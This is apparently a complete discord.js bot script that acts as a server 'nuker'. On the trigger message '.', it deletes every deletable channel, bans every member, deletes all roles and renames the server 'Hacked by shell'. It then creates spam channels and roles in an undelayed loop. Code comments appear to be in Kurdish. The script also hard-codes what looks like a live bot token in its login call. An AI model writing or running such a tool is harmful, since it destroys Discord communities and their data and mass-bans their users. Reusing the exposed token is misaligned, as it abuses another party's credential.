const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("Hacked by shell");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("Hacked by shell", "text");///////bo channel 
        message.guild.createChannel("Hacked by shell", "voice");////bo voice
        message.guild.createRole({ name: "Hacked by shell" });////nawek dane bo role kan
      });
    }
  }
});

client.login("OTk2NDAyNTgzMDM4MDg3Mjg5.GcawQX.RxWhziEQ3Np7O0bpt2SoPdv6Q89oa5x2qXyyB0")
